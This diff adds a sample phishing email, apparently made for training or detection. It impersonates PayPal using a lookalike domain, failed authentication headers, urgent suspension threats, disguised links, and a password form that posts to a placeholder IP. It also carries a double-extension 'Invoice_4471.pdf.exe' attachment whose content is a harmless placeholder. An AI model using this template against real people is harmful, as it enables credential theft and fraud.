@@ -1,0 +1,38 @@
+Received: from mail-gw.paypa1-secure-login.com (unknown [203.0.113.45])
+	by mx.example-mail.net (Postfix) with ESMTP id 4F2A1; Mon, 05 Oct 2026 03:12:44 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by mail-gw.paypa1-secure-login.com (Postfix) with ESMTP id 9C1; Sun, 04 Oct 2026 21:58:10 +0000
+Authentication-Results: mx.example-mail.net;
+	spf=fail (203.0.113.45 is not a permitted sender) smtp.mailfrom=bounce@mailer.bulk-sender.top;
+	dkim=none; dmarc=fail (p=none) header.from=paypa1-secure-login.com
+Return-Path: <bounce@mailer.bulk-sender.top>
+From: "PayPal Support" <security-alert@paypa1-secure-login.com>
+Reply-To: <recovery.desk@gmail.com>
+To: student@example-mail.net
+Subject: URGENT: Your account has been suspended - verify within 24 hours!
+Date: Mon, 05 Oct 2026 03:12:40 +0000
+Message-ID: <a1b2c3@mail-gw.paypa1-secure-login.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY1"
+
+--BOUNDARY1
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We detected <b>unauthorized access</b> to your account. Your account has been suspended. You must verify your account immediately or it will be permanently closed within 24 hours.</p>
+<p><a href="http://paypal.com.account-verify.top/signin?redirect=http://203.0.113.45/collect">https://www.paypal.com/myaccount/verify</a></p>
+<p>Update your payment details: <a href="http://203.0.113.45/update.php">Update Now</a></p>
+<p>Quick link: <a href="https://bit.ly/3xYz123">https://bit.ly/3xYz123</a></p>
+<form action="http://203.0.113.45/login.php"><input type="text" name="email"><input type="password" name="pw"></form>
+<p>PayPal Security Team</p>
+</body></html>
+
+--BOUNDARY1
+Content-Type: application/octet-stream; name="Invoice_4471.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_4471.pdf.exe"
+Content-Transfer-Encoding: base64
+
+REVNTy1PTkxZLU5PVC1BLVJFQUwtRVhFQ1VUQUJMRQ==
+
+--BOUNDARY1--
